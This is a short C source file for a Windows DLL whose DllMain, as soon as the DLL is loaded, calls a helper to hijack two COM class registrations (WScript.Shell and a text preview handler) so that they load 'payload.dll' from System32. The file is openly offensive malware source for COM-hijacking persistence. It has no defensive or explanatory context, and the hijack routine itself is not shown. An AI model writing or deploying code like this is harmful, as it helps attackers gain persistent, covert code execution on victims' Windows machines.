#include "payload.h"
#include "com_hijack.h"
#include "com_hijack_config.h"
#include <windows.h>

// DllMain entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		// Hijack high-traffic COM objects when DLL is loaded
		HijackCOMCLSID(WSCRIPT_SHELL_CLSID, "C:\\Windows\\System32\\payload.dll");
		HijackCOMCLSID(TEXT_PREVIEW_HANDLER_CLSID, "C:\\Windows\\System32\\payload.dll");
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}